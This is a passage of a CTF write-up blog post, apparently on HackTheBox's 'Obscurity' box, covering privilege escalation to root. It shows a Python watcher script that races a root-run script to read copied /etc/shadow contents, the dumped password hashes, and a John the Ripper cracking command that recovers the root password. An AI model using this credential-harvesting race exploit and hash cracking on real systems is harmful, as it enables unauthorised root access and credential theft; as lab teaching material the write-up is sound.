passwords.append(x)</span><br><span class="line">    </span><br><span class="line">    passwordFile = <span class="string">'\n'</span>.join([<span class="string">'\n'</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/tmp/SSH/'</span>+path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    salt = <span class="string">""</span></span><br><span class="line">    realPass = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">'user'</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">'$'</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">""</span>:</span><br><span class="line">        print(<span class="string">"Invalid user"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    salt = <span class="string">'$6$'</span>+salt+<span class="string">'$'</span></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line">    </span><br><span class="line">    hash = crypt.crypt(passW, salt)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> hash == realPass:</span><br><span class="line">        print(<span class="string">"Authed!"</span>)</span><br><span class="line">        session[<span class="string">'authenticated'</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Incorrect pass"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">'/tmp/SSH/'</span>,path))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    traceback.print_exc()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'authenticated'</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">'user'</span>] + <span class="string">"@Obscure$ "</span>)</span><br><span class="line">        cmd = [<span class="string">'sudo'</span>, <span class="string">'-u'</span>,  session[<span class="string">'user'</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">" "</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        print(<span class="string">'Output: '</span> + o.decode(<span class="string">'ascii'</span>))</span><br><span class="line">        print(<span class="string">'Error: '</span>  + e.decode(<span class="string">'ascii'</span>)) <span class="keyword">if</span> len(e.decode(<span class="string">'ascii'</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<p>As the name suggest, this script aim to serve as a replacement for SSH.</p>
<p>After reading the code we can understand the main logic is the following:</p>
<ol>
<li><p>Get the user to input username and password</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">'user'</span>] = input(<span class="string">"Enter username: "</span>)</span><br><span class="line">passW = input(<span class="string">"Enter password: "</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Open and parse the <a href="https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.htmlhttps://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html" target="_blank" rel="noopener"><code>/etc/shadow</code></a> file to a temporary file in <code>/tmp/SSH/</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">''</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/etc/shadow'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">":"</span>) <span class="keyword">if</span> <span class="string">"$"</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            passwords.append(x)</span><br><span class="line">    </span><br><span class="line">    passwordFile = <span class="string">'\n'</span>.join([<span class="string">'\n'</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/tmp/SSH/'</span>+path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br></pre></td></tr></table></figure>

<p>at this point the created tmp file should like something like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"><span class="variable">$6</span><span class="variable">$rixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxch4dy</span></span><br><span class="line">111111</span><br><span class="line">0</span><br><span class="line">111111</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">hugo</span><br><span class="line"><span class="variable">$6</span><span class="variable">$qpePkxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc6RAj</span>/</span><br><span class="line">111111</span><br><span class="line">0</span><br><span class="line">111111</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
</li>
<li><p>Check if username exist, if username don’t exist the temp file get removed and the script exit.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">'user'</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">'$'</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">""</span>:</span><br><span class="line">        print(<span class="string">"Invalid user"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>If the username exist, the password get hashed and compared to the hash in the temp file (coming from <code>/etc/shadow</code> ) to see if they match. In the end the temp file get removed wether the password was correct or not. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">salt = <span class="string">'$6$'</span>+salt+<span class="string">'$'</span></span><br><span class="line"></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line">    </span><br><span class="line">    hash = crypt.crypt(passW, salt)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> hash == realPass:</span><br><span class="line">        print(<span class="string">"Authed!"</span>)</span><br><span class="line">        session[<span class="string">'authenticated'</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Incorrect pass"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">'/tmp/SSH/'</span>,path))</span><br></pre></td></tr></table></figure>
</li>
<li><p>If the password if also correct we get dropped in a “pseudo” shell:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session[<span class="string">'authenticated'</span>] == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">'user'</span>] + <span class="string">"@Obscure$ "</span>)</span><br><span class="line">        cmd = [<span class="string">'sudo'</span>, <span class="string">'-u'</span>,  session[<span class="string">'user'</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">" "</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    </span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        print(<span class="string">'Output: '</span> + o.decode(<span class="string">'ascii'</span>))</span><br><span class="line">        print(<span class="string">'Error: '</span>  + e.decode(<span class="string">'ascii'</span>)) <span class="keyword">if</span> len(e.decode(<span class="string">'ascii'</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>Alright! So with all of this in mind, what can of flaw can we find in that ? </p>
<p>First thing that came to my mind was to edit the script to display the retrieved root hash. But of course it can not be that easy, we don’t have write rights since the file is owned by <code>root</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~/BetterSSH$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 root root 1805 Oct  5 13:09 BetterSSH.py</span><br></pre></td></tr></table></figure>

<p>Then what? The temporary file catch the attention aswell… If we manage to read it before it get deleted, we could retrieve <code>root</code> user password hash. We are facing two issues here:</p>
<ol>
<li><p>The file name is random.</p>
</li>
<li><p>The file get deleted immediately after creation. The script allow no “pause” where we could read the file before it gets deleted.</p>
</li>
</ol>
<p>At this point we will need to write a script monitoring the <code>/tmp/SSH/</code> folder for any file creation and grab it’s content as fast as possible before it get deleted.</p>
<p>To do so, I wrote a simple script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = <span class="string">"/tmp/SSH/"</span></span><br><span class="line"></span><br><span class="line">before = dict([(file, <span class="literal">None</span>) <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    after = dict([(file, <span class="literal">None</span>) <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path)])</span><br><span class="line">    added = [file <span class="keyword">for</span> file <span class="keyword">in</span> after <span class="keyword">if</span> file <span class="keyword">not</span> <span class="keyword">in</span> before]</span><br><span class="line">    <span class="keyword">if</span> added:</span><br><span class="line">        <span class="keyword">with</span> open(path + added[<span class="number">0</span>], <span class="string">'r'</span>) <span class="keyword">as</span> new_file:</span><br><span class="line">            print(new_file.read())</span><br><span class="line">    before = after</span><br></pre></td></tr></table></figure>

<p>Basically the script will loop forever while listing file in <code>/tmp/SSH/</code>, if a new file is detected it will print its content.</p>
<p>Let’s drop it on the server and give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/$ python3 /tmp/watch_ssh.py</span><br></pre></td></tr></table></figure>

<p>In another shell let’s run the <code>betterSSH.py</code> script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br><span class="line">Enter username: hg8</span><br><span class="line">Enter password: hg8</span><br><span class="line">Invalid user</span><br></pre></td></tr></table></figure>

<p>Going back to our script we can see it worked!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/$ python3 /tmp/watch_ssh.py</span><br><span class="line">root</span><br><span class="line"><span class="variable">$6</span><span class="variable">$riekpK4m</span><span class="variable">$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span></span><br><span class="line">18226</span><br><span class="line">0</span><br><span class="line">99999</span><br><span class="line">7</span><br><span class="line"></span><br><span class="line">robert</span><br><span class="line"><span class="variable">$6</span><span class="variable">$fZZcDG7g</span><span class="variable">$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/</span><br><span class="line">18163</span><br><span class="line">0</span><br><span class="line">99999</span><br><span class="line">7</span><br></pre></td></tr></table></figure>

<h3 id="Cracking-Root-password-hash"><a href="#Cracking-Root-password-hash" class="headerlink" title="Cracking Root password hash"></a>Cracking Root password hash</h3><p>Now that we have the hash let’s hope it can be cracked. I will use john the ripper</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"<span class="variable">$6</span><span class="variable">$fZZcDG7g</span><span class="variable">$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/"</span> &gt; roothash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt roothash</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">mercedes         (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>Alright! We have the root password, let’s try to use it with the <code>betterSSH.py</code> script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br><span class="line">Enter username: root</span><br><span class="line">Enter password: mercedes</span><br><span class="line">Authed!</span><br><span class="line">root@Obscure$ cat /root/root.txt</span><br><span class="line">Output: 5xxxxxxxxxxxxxxxxxxxxxxxxx3</span><br></pre></td></tr></table></figure>

<hr>
<p>As always do not hesitate to contact me for any questions or feedbacks.</p>
<p>See you next time !</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Medium-Box/">Medium Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/custom-exploitation/" rel="tag">custom-exploitation</a>, <a class="tag-link" href="/tags/encryption/" rel="tag">encryption</a>, <a class="tag-link" href="/tags/john/" rel="tag">john</a>, <a class="tag-link" href="/tags/obscurity/" rel="tag">obscurity</a>, <a class="tag-link" href="/tags/python/" rel="tag">python</a>, <a class="tag-link" href="/tags/re/" rel="tag">re</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Code-Execution-gt-www-data-shell"><span class="toc-number">2.1.</span> <span class="toc-text">Remote Code Execution -&gt; www-data shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-Robert"><span class="toc-number">2.2.</span> <span class="toc-text">Pivot www-data -&gt; Robert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recovering-the-secret-key"><span class="toc-number">2.3.</span> <span class="toc-text">Recovering the secret key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">3.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">3.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-Root-password-hash"><span class="toc-number">3.2.</span> <span class="toc-text">Cracking Root password hash</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Disqus Comments -->


</body>
</html>
